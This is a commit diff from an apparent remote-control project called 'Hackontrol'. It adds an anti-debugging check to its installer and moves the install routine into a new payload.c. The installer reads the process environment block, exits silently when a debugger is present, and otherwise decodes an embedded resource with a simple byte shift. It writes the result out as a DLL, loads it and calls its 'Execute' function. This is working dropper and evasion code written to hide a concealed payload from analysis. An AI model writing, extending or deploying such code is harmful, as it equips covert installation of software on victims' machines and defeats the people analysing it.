cb11622140fb91cc8332c812f7890a5db2a9e71d
KHOPAN <puthipnakchan@gmail.com>
2024-05-24 22:28:31 +0700

    Add debug checker

--- Hackontrol/Hackontrol Installer/main.c
+++ Hackontrol/Hackontrol Installer/main.c
@@ -1,133 +1,219 @@
 #include <stdio.h>
 #include <khopanwin32.h>
-#include <khopanstring.h>
-#include <hackontrol.h>
-#include "resource.h"
+#include "installer.h"
 
-#define FREE(x) if(LocalFree(x)) KHWin32ConsoleErrorW(GetLastError(), L"LocalFree")
+#define RTL_MAX_DRIVE_LETTERS    32
+#define GDI_HANDLE_BUFFER_SIZE64 60
+#define GDI_HANDLE_BUFFER_SIZE GDI_HANDLE_BUFFER_SIZE64
 
-#define FUNCTION_LIBDLL32 "Execute"
+typedef ULONG GDI_HANDLE_BUFFER[GDI_HANDLE_BUFFER_SIZE];
 
-typedef void(__stdcall* Rundll32Function) (HWND window, HINSTANCE instance, LPSTR argument, int command);
+typedef struct _PEB_LDR_DATA {
+    ULONG Length;
+    BOOLEAN Initialized;
+    HANDLE SsHandle;
+    LIST_ENTRY InLoadOrderModuleList;
+    LIST_ENTRY InMemoryOrderModuleList;
+    LIST_ENTRY InInitializationOrderModuleList;
+    PVOID EntryInProgress;
+    BOOLEAN ShutdownInProgress;
+    HANDLE ShutdownThreadId;
+} PEB_LDR_DATA, *PPEB_LDR_DATA;
+
+typedef struct _UNICODE_STRING {
+    USHORT Length;
+    USHORT MaximumLength;
+    PWSTR Buffer;
+} UNICODE_STRING, *PUNICODE_STRING;
+
+typedef struct _CURDIR {
+    UNICODE_STRING DosPath;
+    HANDLE Handle;
+} CURDIR, *PCURDIR;
+
+typedef struct _RTL_DRIVE_LETTER_CURDIR {
+    USHORT Flags;
+    USHORT Length;
+    ULONG TimeStamp;
+    UNICODE_STRING DosPath;
+} RTL_DRIVE_LETTER_CURDIR, *PRTL_DRIVE_LETTER_CURDIR;
+
+typedef struct _RTL_USER_PROCESS_PARAMETERS {
+    ULONG MaximumLength;
+    ULONG Length;
+    ULONG Flags;
+    ULONG DebugFlags;
+    HANDLE ConsoleHandle;
+    ULONG ConsoleFlags;
+    HANDLE StandardInput;
+    HANDLE StandardOutput;
+    HANDLE StandardError;
+    CURDIR CurrentDirectory;
+    UNICODE_STRING DllPath;
+    UNICODE_STRING ImagePathName;
+    UNICODE_STRING CommandLine;
+    PWCHAR Environment;
+    ULONG StartingX;
+    ULONG StartingY;
+    ULONG CountX;
+    ULONG CountY;
+    ULONG CountCharsX;
+    ULONG CountCharsY;
+    ULONG FillAttribute;
+    ULONG WindowFlags;
+    ULONG ShowWindowFlags;
+    UNICODE_STRING WindowTitle;
+    UNICODE_STRING DesktopInfo;
+    UNICODE_STRING ShellInfo;
+    UNICODE_STRING RuntimeData;
+    RTL_DRIVE_LETTER_CURDIR CurrentDirectories[RTL_MAX_DRIVE_LETTERS];
+    ULONG_PTR EnvironmentSize;
+    ULONG_PTR EnvironmentVersion;
+    PVOID PackageDependencyData;
+    ULONG ProcessGroupId;
+    ULONG LoaderThreads;
+} RTL_USER_PROCESS_PARAMETERS, *PRTL_USER_PROCESS_PARAMETERS;
+
+typedef struct _PEB {
+    BOOLEAN InheritedAddressSpace;
+    BOOLEAN ReadImageFileExecOptions;
+    BOOLEAN BeingDebugged;
+
+    union {
+        BOOLEAN BitField;
+
+        struct {
+            BOOLEAN ImageUsesLargePages : 1;
+            BOOLEAN IsProtectedProcess : 1;
+            BOOLEAN IsImageDynamicallyRelocated : 1;
+            BOOLEAN SkipPatchingUser32Forwarders : 1;
+            BOOLEAN IsPackagedProcess : 1;
+            BOOLEAN IsAppContainer : 1;
+            BOOLEAN IsProtectedProcessLight : 1;
+            BOOLEAN IsLongPathAwareProcess : 1;
+        } s1;
+    } u1;
+
+    HANDLE Mutant;
+    PVOID ImageBaseAddress;
+    PPEB_LDR_DATA Ldr;
+    PRTL_USER_PROCESS_PARAMETERS ProcessParameters;
+    PVOID SubSystemData;
+    PVOID ProcessHeap;
+    PRTL_CRITICAL_SECTION FastPebLock;
+    PVOID AtlThunkSListPtr;
+    PVOID IFEOKey;
+
+    union {
+        ULONG CrossProcessFlags;
+
+        struct {
+            ULONG ProcessInJob : 1;
+            ULONG ProcessInitializing : 1;
+            ULONG ProcessUsingVEH : 1;
+            ULONG ProcessUsingVCH : 1;
+            ULONG ProcessUsingFTH : 1;
+            ULONG ProcessPreviouslyThrottled : 1;
+            ULONG ProcessCurrentlyThrottled : 1;
+            ULONG ReservedBits0 : 25;
+        } s2;
+    } u2;
+
+    union {
+        PVOID KernelCallbackTable;
+        PVOID UserSharedInfoPtr;
+    } u3;
+
+    ULONG SystemReserved[1];
+    ULONG AtlThunkSListPtr32;
+    PVOID ApiSetMap;
+    ULONG TlsExpansionCounter;
+    PVOID TlsBitmap;
+    ULONG TlsBitmapBits[2];
+    PVOID ReadOnlySharedMemoryBase;
+    PVOID SharedData;
+    PVOID* ReadOnlyStaticServerData;
+    PVOID AnsiCodePageData;
+    PVOID OemCodePageData;
+    PVOID UnicodeCaseTableData;
+    ULONG NumberOfProcessors;
+    ULONG NtGlobalFlag;
+    LARGE_INTEGER CriticalSectionTimeout;
+    SIZE_T HeapSegmentReserve;
+    SIZE_T HeapSegmentCommit;
+    SIZE_T HeapDeCommitTotalFreeThreshold;
+    SIZE_T HeapDeCommitFreeBlockThreshold;
+    ULONG NumberOfHeaps;
+    ULONG MaximumNumberOfHeaps;
+    PVOID* ProcessHeaps;
+    PVOID GdiSharedHandleTable;
+    PVOID ProcessStarterHelper;
+    ULONG GdiDCAttributeList;
+    PRTL_CRITICAL_SECTION LoaderLock;
+    ULONG OSMajorVersion;
+    ULONG OSMinorVersion;
+    USHORT OSBuildNumber;
+    USHORT OSCSDVersion;
+    ULONG OSPlatformId;
+    ULONG ImageSubsystem;
+    ULONG ImageSubsystemMajorVersion;
+    ULONG ImageSubsystemMinorVersion;
+    ULONG_PTR ActiveProcessAffinityMask;
+    GDI_HANDLE_BUFFER GdiHandleBuffer;
+    PVOID PostProcessInitRoutine;
+    PVOID TlsExpansionBitmap;
+    ULONG TlsExpansionBitmapBits[32];
+    ULONG SessionId;
+    ULARGE_INTEGER AppCompatFlags;
+    ULARGE_INTEGER AppCompatFlagsUser;
+    PVOID pShimData;
+    PVOID AppCompatInfo;
+    UNICODE_STRING CSDVersion;
+    PVOID ActivationContextData;
+    PVOID ProcessAssemblyStorageMap;
+    PVOID SystemDefaultActivationContextData;
+    PVOID SystemAssemblyStorageMap;
+    SIZE_T MinimumStackCommit;
+    PVOID* FlsCallback;
+    LIST_ENTRY FlsListHead;
+    PVOID FlsBitmap;
+    ULONG FlsBitmapBits[FLS_MAXIMUM_AVAILABLE / (sizeof(ULONG) * 8)];
+    ULONG FlsHighIndex;
+    PVOID WerRegistrationData;
+    PVOID WerShipAssertPtr;
+    PVOID pUnused;
+    PVOID pImageHeaderHash;
+
+    union {
+        ULONG TracingFlags;
+
+        struct {
+            ULONG HeapTracingEnabled : 1;
+            ULONG CritSecTracingEnabled : 1;
+            ULONG LibLoaderTracingEnabled : 1;
+            ULONG SpareTracingBits : 29;
+        } s3;
+    } u4;
+
+    ULONGLONG CsrServerReadOnlySharedMemoryBase;
+    PVOID TppWorkerpListLock;
+    LIST_ENTRY TppWorkerpList;
+    PVOID WaitOnAddressHashTable[128];
+    PVOID TelemetryCoverageHeader;
+    ULONG CloudFileFlags;
+} PEB, *PPEB;
 
 int main(int argc, char** argv) {
-	printf("Finding resource\n");
-	HRSRC resourceHandle = FindResourceW(NULL, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);
+    PPEB block = (PPEB) __readgsqword(0x60);
 
-	if(!resourceHandle) {
-		KHWin32ConsoleErrorW(GetLastError(), L"FindResourceW");
-		return 1;
+    if(!block) {
+        KHWin32ConsoleErrorW(ERROR_FUNCTION_FAILED, L"__readgsqword");
+        return 1;
+    }
+
+	if(block->BeingDebugged) {
+        return 0;
 	}
 
-	DWORD resourceSize = SizeofResource(NULL, resourceHandle);
-
-	if(!resourceSize) {
-		KHWin32ConsoleErrorW(GetLastError(), L"SizeofResource");
-		return 1;
-	}
-
-	printf("Resource size: %lu byte(s)\nLoading resource\n", resourceSize);
-	HGLOBAL resource = LoadResource(NULL, resourceHandle);
-
-	if(!resource) {
-		KHWin32ConsoleErrorW(GetLastError(), L"LoadResource");
-		return 1;
-	}
-
-	BYTE* data = LockResource(resource);
-
-	if(!data) {
-		KHWin32ConsoleErrorW(GetLastError(), L"LockResource");
-		return 1;
-	}
-
-	BYTE* buffer = LocalAlloc(LMEM_FIXED, resourceSize);
-
-	if(!buffer) {
-		KHWin32ConsoleErrorW(GetLastError(), L"LocalAlloc");
-		return 1;
-	}
-
-	printf("Allocate memory: %lu byte(s)\n", resourceSize);
-
-	for(DWORD i = 0; i < resourceSize; i++) {
-		buffer[i] = (data[i] - 18) % 0xFF;
-	}
-
-	LPWSTR pathFolderHackontrol = GetHackontrolDirectory();
-
-	if(!pathFolderHackontrol) {
-		KHWin32ConsoleErrorW(GetLastError(), L"GetHackontrolDirectory");
-		FREE(buffer);
-		return 1;
-	}
-
-	LPWSTR pathFileLibdll32 = KHFormatMessageW(L"%ws\\" FILE_LIBDLL32, pathFolderHackontrol);
-	FREE(pathFolderHackontrol);
-
-	if(!pathFileLibdll32) {
-		KHWin32ConsoleErrorW(ERROR_FUNCTION_FAILED, L"KHFormatMessageW");
-		FREE(buffer);
-		return 1;
-	}
-
-	printf("DLL: %ws\nCreate file\n", pathFileLibdll32);
-	HANDLE file = CreateFileW(pathFileLibdll32, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-
-	if(file == INVALID_HANDLE_VALUE) {
-		KHWin32ConsoleErrorW(GetLastError(), L"CreateFileW");
-		FREE(pathFileLibdll32);
-		FREE(buffer);
-		return 1;
-	}
-
-	DWORD written = 0;
-	BOOL result = WriteFile(file, buffer, resourceSize, &written, NULL);
-	FREE(buffer);
-	
-	if(!result) {
-		KHWin32ConsoleErrorW(GetLastError(), L"WriteFile");
-		FREE(pathFileLibdll32);
-		return 1;
-	}
-
-	printf("Size:    %lu byte(s)\nWritten: %lu byte(s)\n", resourceSize, written);
-
-	if(resourceSize != written) {
-		KHWin32ConsoleErrorW(ERROR_FUNCTION_FAILED, L"WriteFile");
-		FREE(pathFileLibdll32);
-		return 1;
-	}
-
-	if(!CloseHandle(file)) {
-		KHWin32ConsoleErrorW(GetLastError(), L"CloseHandle");
-		FREE(pathFileLibdll32);
-		return 1;
-	}
-
-	printf("File closed\nLoading DLL\n");
-	HMODULE module = LoadLibraryW(pathFileLibdll32);
-	FREE(pathFileLibdll32);
-
-	if(!module) {
-		KHWin32ConsoleErrorW(GetLastError(), L"LoadLibraryW");
-		return 1;
-	}
-
-	Rundll32Function function = (Rundll32Function) GetProcAddress(module, FUNCTION_LIBDLL32);
-
-	if(!function) {
-		KHWin32ConsoleErrorW(GetLastError(), L"GetProcAddress");
-		goto freeLibrary;
-	}
-
-	function(NULL, NULL, NULL, 0);
-	printf("Finished\n");
-freeLibrary:
-	if(!FreeLibrary(module)) {
-		KHWin32ConsoleErrorW(GetLastError(), L"FreeLibrary");
-		return 1;
-	}
-
-	return 0;
+	return InstallHackontrol();
 }
---
+++ Hackontrol/Hackontrol Installer/payload.c
@@ -0,0 +1,134 @@
+#include <stdio.h>
+#include <khopanwin32.h>
+#include <khopanstring.h>
+#include <hackontrol.h>
+#include "resource.h"
+#include "installer.h"
+
+#define FREE(x) if(LocalFree(x)) KHWin32ConsoleErrorW(GetLastError(), L"LocalFree")
+
+#define FUNCTION_LIBDLL32 "Execute"
+
+typedef void(__stdcall* Rundll32Function) (HWND window, HINSTANCE instance, LPSTR argument, int command);
+
+int InstallHackontrol() {
+	printf("Finding resource\n");
+	HRSRC resourceHandle = FindResourceW(NULL, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);
+
+	if(!resourceHandle) {
+		KHWin32ConsoleErrorW(GetLastError(), L"FindResourceW");
+		return 1;
+	}
+
+	DWORD resourceSize = SizeofResource(NULL, resourceHandle);
+
+	if(!resourceSize) {
+		KHWin32ConsoleErrorW(GetLastError(), L"SizeofResource");
+		return 1;
+	}
+
+	printf("Resource size: %lu byte(s)\nLoading resource\n", resourceSize);
+	HGLOBAL resource = LoadResource(NULL, resourceHandle);
+
+	if(!resource) {
+		KHWin32ConsoleErrorW(GetLastError(), L"LoadResource");
+		return 1;
+	}
+
+	BYTE* data = LockResource(resource);
+
+	if(!data) {
+		KHWin32ConsoleErrorW(GetLastError(), L"LockResource");
+		return 1;
+	}
+
+	BYTE* buffer = LocalAlloc(LMEM_FIXED, resourceSize);
+
+	if(!buffer) {
+		KHWin32ConsoleErrorW(GetLastError(), L"LocalAlloc");
+		return 1;
+	}
+
+	printf("Allocate memory: %lu byte(s)\n", resourceSize);
+
+	for(DWORD i = 0; i < resourceSize; i++) {
+		buffer[i] = (data[i] - 18) % 0xFF;
+	}
+
+	LPWSTR pathFolderHackontrol = GetHackontrolDirectory();
+
+	if(!pathFolderHackontrol) {
+		KHWin32ConsoleErrorW(GetLastError(), L"GetHackontrolDirectory");
+		FREE(buffer);
+		return 1;
+	}
+
+	LPWSTR pathFileLibdll32 = KHFormatMessageW(L"%ws\\" FILE_LIBDLL32, pathFolderHackontrol);
+	FREE(pathFolderHackontrol);
+
+	if(!pathFileLibdll32) {
+		KHWin32ConsoleErrorW(ERROR_FUNCTION_FAILED, L"KHFormatMessageW");
+		FREE(buffer);
+		return 1;
+	}
+
+	printf("DLL: %ws\nCreate file\n", pathFileLibdll32);
+	HANDLE file = CreateFileW(pathFileLibdll32, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+
+	if(file == INVALID_HANDLE_VALUE) {
+		KHWin32ConsoleErrorW(GetLastError(), L"CreateFileW");
+		FREE(pathFileLibdll32);
+		FREE(buffer);
+		return 1;
+	}
+
+	DWORD written = 0;
+	BOOL result = WriteFile(file, buffer, resourceSize, &written, NULL);
+	FREE(buffer);
+
+	if(!result) {
+		KHWin32ConsoleErrorW(GetLastError(), L"WriteFile");
+		FREE(pathFileLibdll32);
+		return 1;
+	}
+
+	printf("Size:    %lu byte(s)\nWritten: %lu byte(s)\n", resourceSize, written);
+
+	if(resourceSize != written) {
+		KHWin32ConsoleErrorW(ERROR_FUNCTION_FAILED, L"WriteFile");
+		FREE(pathFileLibdll32);
+		return 1;
+	}
+
+	if(!CloseHandle(file)) {
+		KHWin32ConsoleErrorW(GetLastError(), L"CloseHandle");
+		FREE(pathFileLibdll32);
+		return 1;
+	}
+
+	printf("File closed\nLoading DLL\n");
+	HMODULE module = LoadLibraryW(pathFileLibdll32);
+	FREE(pathFileLibdll32);
+
+	if(!module) {
+		KHWin32ConsoleErrorW(GetLastError(), L"LoadLibraryW");
+		return 1;
+	}
+
+	Rundll32Function function = (Rundll32Function) GetProcAddress(module, FUNCTION_LIBDLL32);
+
+	if(!function) {
+		KHWin32ConsoleErrorW(GetLastError(), L"GetProcAddress");
+		goto freeLibrary;
+	}
+
+	function(NULL, NULL, NULL, 0);
+	printf("Finished\n");
+freeLibrary:
+	if(!FreeLibrary(module)) {
+		KHWin32ConsoleErrorW(GetLastError(), L"FreeLibrary");
+		return 1;
+	}
+
+	return 0;
+}
